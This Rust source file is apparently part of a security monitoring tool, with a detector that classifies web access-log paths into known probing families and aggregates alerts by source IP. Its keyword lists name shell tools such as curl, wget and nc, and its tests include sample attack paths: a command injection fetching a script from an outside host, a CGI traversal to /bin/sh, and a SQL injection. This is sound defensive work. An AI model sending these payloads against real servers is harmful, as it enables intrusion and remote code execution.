use crate::detectors::{evidence, field_is_allowlisted, string_field, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Finding, RawEvent, Severity};
use std::collections::{BTreeMap, BTreeSet};

pub struct WebDetector;

impl Detector for WebDetector {
    fn name(&self) -> &'static str {
        "web_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "WEB-001",
                "Web vulnerability probing detected",
                Category::Web,
                Severity::Medium,
                "Web logs contain paths commonly used by automated vulnerability scanners.",
            ),
            RuleMetadata::new(
                "WEB-002",
                "Repeated web errors from one source",
                Category::Web,
                Severity::Low,
                "One source IP produced repeated 403/404 responses in the scanned window.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        let mut errors_by_ip: BTreeMap<String, usize> = BTreeMap::new();
        let mut probes = BTreeMap::<ProbeGroupKey, ProbeGroup>::new();
        let mut probe_ips = BTreeSet::<String>::new();

        for event in events.iter().filter(|event| event.kind == "web_access") {
            let ip = string_field(event, "ip");
            if field_is_allowlisted(&ip, &ctx.config.allowlist.ips) {
                continue;
            }
            let path = string_field(event, "path");
            if let Some(signature) = classify_probe_path(&path) {
                probe_ips.insert(ip.clone());
                let key = ProbeGroupKey {
                    ip,
                    family: signature.family,
                    response: ResponseProfile::from_status(event.field("status").unwrap_or("")),
                };
                probes.entry(key).or_default().push(event, signature);
            }
            if matches!(event.field("status"), Some("403") | Some("404")) {
                *errors_by_ip.entry(string_field(event, "ip")).or_insert(0) += 1;
            }
        }

        findings.extend(
            probes
                .into_iter()
                .map(|(key, group)| web_probe_group(key, group, ctx)),
        );
        for (ip, count) in errors_by_ip {
            if !probe_ips.contains(&ip) && count >= ctx.config.web.error_burst_threshold {
                findings.push(web_error_burst(&ip, count, ctx));
            }
        }
        findings
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum ProbeFamily {
    EnvFile,
    GitExposure,
    PhpUnitEvalStdin,
    CgiShellTraversal,
    CommandInjection,
    SqlInjection,
    PathTraversal,
    PhpMyAdmin,
    WordpressAdmin,
    BoaForm,
    Actuator,
    ServerStatus,
    GenericCgi,
}

impl ProbeFamily {
    fn id(self) -> &'static str {
        match self {
            Self::EnvFile => "env_file",
            Self::GitExposure => "git_exposure",
            Self::PhpUnitEvalStdin => "phpunit_eval_stdin",
            Self::CgiShellTraversal => "cgi_shell_traversal",
            Self::CommandInjection => "command_injection",
            Self::SqlInjection => "sql_injection",
            Self::PathTraversal => "path_traversal",
            Self::PhpMyAdmin => "phpmyadmin",
            Self::WordpressAdmin => "wordpress_admin",
            Self::BoaForm => "boaform",
            Self::Actuator => "actuator",
            Self::ServerStatus => "server_status",
            Self::GenericCgi => "generic_cgi",
        }
    }

    fn base_severity(self) -> Severity {
        match self {
            Self::CgiShellTraversal | Self::CommandInjection | Self::SqlInjection => {
                Severity::Medium
            }
            _ => Severity::Low,
        }
    }

    fn success_severity(self) -> Severity {
        match self {
            Self::EnvFile
            | Self::GitExposure
            | Self::PhpUnitEvalStdin
            | Self::CgiShellTraversal
            | Self::CommandInjection
            | Self::SqlInjection
            | Self::PathTraversal => Severity::High,
            _ => Severity::Medium,
        }
    }

    fn protected_severity(self) -> Severity {
        match self {
            Self::EnvFile
            | Self::GitExposure
            | Self::PhpUnitEvalStdin
            | Self::CgiShellTraversal
            | Self::CommandInjection
            | Self::SqlInjection
            | Self::PathTraversal => Severity::Medium,
            _ => Severity::Low,
        }
    }
}

#[derive(Debug, Clone, Copy)]
struct ProbeSignature {
    family: ProbeFamily,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum ResponseProfile {
    Successful,
    Protected,
    Redirected,
    MissingOrRejected,
    ServerError,
    Unknown,
}

impl ResponseProfile {
    fn from_status(status: &str) -> Self {
        match status.parse::<u16>().ok() {
            Some(200..=299) => Self::Successful,
            Some(401 | 403) => Self::Protected,
            Some(300..=399) => Self::Redirected,
            Some(400..=499) => Self::MissingOrRejected,
            Some(500..=599) => Self::ServerError,
            _ => Self::Unknown,
        }
    }

    fn id(self) -> &'static str {
        match self {
            Self::Successful => "successful_response",
            Self::Protected => "protected_response",
            Self::Redirected => "redirected_response",
            Self::MissingOrRejected => "missing_or_rejected",
            Self::ServerError => "server_error",
            Self::Unknown => "unknown_response",
        }
    }

    fn severity_for(self, family: ProbeFamily) -> Severity {
        match self {
            Self::Successful => family.success_severity(),
            Self::Protected => family.protected_severity(),
            Self::ServerError => Severity::Medium,
            Self::Redirected | Self::MissingOrRejected | Self::Unknown => family.base_severity(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct ProbeGroupKey {
    ip: String,
    family: ProbeFamily,
    response: ResponseProfile,
}

#[derive(Debug, Default)]
struct ProbeGroup {
    count: usize,
    methods: BTreeSet<String>,
    statuses: BTreeSet<String>,
    log_sources: BTreeSet<String>,
    sample_paths: Vec<String>,
}

impl ProbeGroup {
    fn push(&mut self, event: &RawEvent, _signature: ProbeSignature) {
        self.count += 1;
        insert_nonempty(&mut self.methods, event.field("method"));
        insert_nonempty(&mut self.statuses, event.field("status"));
        insert_nonempty(&mut self.log_sources, event.field("log_source"));
        let path = string_field(event, "path");
        if !path.trim().is_empty()
            && !self.sample_paths.contains(&path)
            && self.sample_paths.len() < 5
        {
            self.sample_paths.push(path);
        }
    }
}

fn insert_nonempty(values: &mut BTreeSet<String>, value: Option<&str>) {
    if let Some(value) = value.filter(|value| !value.trim().is_empty()) {
        values.insert(value.to_string());
    }
}

fn web_probe_group(key: ProbeGroupKey, group: ProbeGroup, ctx: &DetectContext) -> Finding {
    let family = key.family;
    let response = key.response;
    let subject = key.ip.clone();
    let severity = response.severity_for(family);

    Finding::new(
        &ctx.host_id,
        "Web vulnerability probing detected",
        "Web requests match a known probing family. Similar paths from the same source are aggregated to reduce alert noise.",
        severity,
        Category::Web,
        "WEB-001",
        subject,
    )
    .with_evidence_deduped_by(
        vec![
            evidence("ip", key.ip),
            evidence("probe_family", family.id()),
            evidence("response_profile", response.id()),
            evidence("request_count", group.count.to_string()),
            evidence("methods", join_set(&group.methods)),
            evidence("statuses", join_set(&group.statuses)),
            evidence("sample_paths", group.sample_paths.join(", ")),
            evidence("log_sources", join_set(&group.log_sources)),
        ],
        &["ip", "probe_family", "response_profile"],
    )
    .with_recommendations(vec![
        "Review whether any probe path returned a successful or protected response.".to_string(),
        "Correlate with file changes and process anomalies around the same time.".to_string(),
    ])
}

fn join_set(values: &BTreeSet<String>) -> String {
    values.iter().cloned().collect::<Vec<_>>().join(", ")
}

fn web_error_burst(ip: &str, count: usize, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Repeated web errors from one source",
        "One source IP generated many 403/404 responses in the scanned log window.",
        Severity::Low,
        Category::Web,
        "WEB-002",
        ip,
    )
    .with_evidence(vec![
        evidence("ip", ip),
        evidence("error_count", count.to_string()),
    ])
    .with_recommendations(vec![
        "Treat this as context unless it correlates with successful requests or host changes."
            .to_string(),
    ])
}

#[cfg(test)]
fn is_probe_path(path: &str) -> bool {
    classify_probe_path(path).is_some()
}

#[cfg(test)]
fn contains_attack_payload(path: &str) -> bool {
    let normalized = NormalizedPath::new(path);
    normalized.contains_command_payload() || normalized.contains_sql_payload()
}

fn classify_probe_path(path: &str) -> Option<ProbeSignature> {
    let normalized = NormalizedPath::new(path);
    if normalized.contains("cgi-bin") && normalized.contains("bin/sh") {
        return Some(ProbeSignature {
            family: ProbeFamily::CgiShellTraversal,
        });
    }
    if normalized.contains_command_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::CommandInjection,
        });
    }
    if normalized.contains_sql_payload() {
        return Some(ProbeSignature {
            family: ProbeFamily::SqlInjection,
        });
    }
    if normalized.contains("vendor/phpunit") && normalized.contains("eval-stdin.php") {
        return Some(ProbeSignature {
            family: ProbeFamily::PhpUnitEvalStdin,
        });
    }
    for (marker, family) in [
        (".env", ProbeFamily::EnvFile),
        ("/.git", ProbeFamily::GitExposure),
        ("wp-admin", ProbeFamily::WordpressAdmin),
        ("phpmyadmin", ProbeFamily::PhpMyAdmin),
        ("boaform", ProbeFamily::BoaForm),
        ("actuator", ProbeFamily::Actuator),
        ("server-status", ProbeFamily::ServerStatus),
        ("/etc/passwd", ProbeFamily::PathTraversal),
        ("../", ProbeFamily::PathTraversal),
        ("cgi-bin", ProbeFamily::GenericCgi),
    ] {
        if normalized.contains(marker) {
            return Some(ProbeSignature { family });
        }
    }
    None
}

struct NormalizedPath {
    raw: String,
    decoded: String,
    spaced: String,
}

impl NormalizedPath {
    fn new(path: &str) -> Self {
        let raw = path.to_ascii_lowercase();
        let decoded = percent_decode_lossy(path).to_ascii_lowercase();
        let spaced = decoded.replace('+', " ");
        Self {
            raw,
            decoded,
            spaced,
        }
    }

    fn contains(&self, marker: &str) -> bool {
        self.raw.contains(marker) || self.decoded.contains(marker)
    }

    fn contains_command_payload(&self) -> bool {
        has_shell_expansion(&self.spaced) || has_command_after_shell_operator(&self.spaced)
    }

    fn contains_sql_payload(&self) -> bool {
        self.spaced.contains(" or 1=1") || self.spaced.contains("union select")
    }
}

fn has_shell_expansion(value: &str) -> bool {
    has_command_after_marker(value, "$(") || has_command_after_marker(value, "`")
}

fn has_command_after_shell_operator(value: &str) -> bool {
    [";", "|", "&&"]
        .iter()
        .any(|operator| command_after_operator(value, operator))
}

fn command_after_operator(value: &str, operator: &str) -> bool {
    value.split(operator).skip(1).any(|tail| {
        tail.split(|ch: char| ch.is_whitespace() || ch == '/' || ch == '&' || ch == '|')
            .filter(|token| !token.is_empty())
            .take(3)
            .any(is_shell_command_token)
    })
}

fn has_command_after_marker(value: &str, marker: &str) -> bool {
    value.split(marker).skip(1).any(|tail| {
        tail.split(|ch: char| {
            ch.is_whitespace()
                || matches!(
                    ch,
                    '/' | '&' | '|' | ';' | ')' | '(' | '"' | '\'' | '`' | '<' | '>'
                )
        })
        .filter(|token| !token.is_empty())
        .take(3)
        .any(is_shell_command_token)
    })
}

fn is_shell_command_token(token: &str) -> bool {
    matches!(
        token,
        "curl" | "wget" | "bash" | "sh" | "nc" | "ncat" | "id" | "whoami" | "uname" | "cat"
    )
}

fn percent_decode_lossy(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut decoded = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'%' && index + 2 < bytes.len() {
            if let (Some(high), Some(low)) =
                (hex_value(bytes[index + 1]), hex_value(bytes[index + 2]))
            {
                decoded.push((high << 4) | low);
                index += 3;
                continue;
            }
        }
        decoded.push(bytes[index]);
        index += 1;
    }
    String::from_utf8_lossy(&decoded).into_owned()
}

fn hex_value(value: u8) -> Option<u8> {
    match value {
        b'0'..=b'9' => Some(value - b'0'),
        b'a'..=b'f' => Some(value - b'a' + 10),
        b'A'..=b'F' => Some(value - b'A' + 10),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::{contains_attack_payload, is_probe_path, WebDetector};
    use crate::detectors::{DetectContext, Detector};
    use sentinel_core::{RawEvent, SentinelConfig, Severity};
    use std::sync::Arc;

    #[test]
    fn recognizes_common_web_probe_paths() {
        assert!(is_probe_path("/.env"));
        assert!(is_probe_path(
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        ));
        assert!(contains_attack_payload("/index.php?q=1%20union%20select"));
        assert!(!is_probe_path("/assets/app.css"));
    }

    #[test]
    fn web_error_burst_threshold_is_configurable() {
        let mut config = SentinelConfig::default();
        config.web.error_burst_threshold = 3;
        let ctx = DetectContext::new(Arc::new(config));
        let events = vec![
            access_error("203.0.113.10", "/missing-1"),
            access_error("203.0.113.10", "/missing-2"),
            access_error("203.0.113.10", "/missing-3"),
            access_error("203.0.113.11", "/missing-1"),
            access_error("203.0.113.11", "/missing-2"),
        ];

        let findings = WebDetector.detect(&events, &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-002");
        assert_eq!(findings[0].subject, "203.0.113.10");
    }

    #[test]
    fn web_probe_paths_are_aggregated_by_source_family_and_response() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let events = vec![
            access_error(
                "198.51.100.7",
                "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            ),
            access_error(
                "198.51.100.7",
                "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            ),
            access_error(
                "198.51.100.7",
                "/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            ),
        ];

        let findings = WebDetector.detect(&events, &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert_eq!(findings[0].severity, Severity::Low);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "request_count" && item.value == "3"));
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "probe_family" && item.value == "phpunit_eval_stdin" }));
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "response_profile" && item.value == "missing_or_rejected" }));
    }

    #[test]
    fn encoded_command_payload_is_classified_without_flagging_normal_query() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let malicious = access_event(
            "203.0.113.40",
            "GET",
            "/index.php?x=%3Bcurl%20http://203.0.113.9/a.sh",
            "404",
        );
        let normal = access_event("203.0.113.41", "GET", "/search?q=curling+club", "404");
        let quoted_query = access_event("203.0.113.42", "GET", "/search?q=%60example%60", "404");

        let findings = WebDetector.detect(&[malicious, normal, quoted_query], &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "probe_family" && item.value == "command_injection" }));
    }

    #[test]
    fn successful_sensitive_probe_is_high_value() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = access_event("203.0.113.20", "GET", "/.env", "200");

        let findings = WebDetector.detect(&[event], &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn exploit_payload_probe_aggregates_as_medium_when_rejected() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let events = vec![
            access_event(
                "203.0.113.30",
                "POST",
                "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
                "400",
            ),
            access_event(
                "203.0.113.30",
                "POST",
                "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
                "400",
            ),
        ];

        let findings = WebDetector.detect(&events, &ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "WEB-001");
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| { item.key == "probe_family" && item.value == "cgi_shell_traversal" }));
    }

    fn access_error(ip: &str, path: &str) -> RawEvent {
        access_event(ip, "GET", path, "404")
    }

    fn access_event(ip: &str, method: &str, path: &str, status: &str) -> RawEvent {
        RawEvent::new("web", "web_access")
            .with_field("ip", ip)
            .with_field("method", method)
            .with_field("path", path)
            .with_field("status", status)
            .with_field("log_source", "/var/log/nginx/access.log")
    }
}
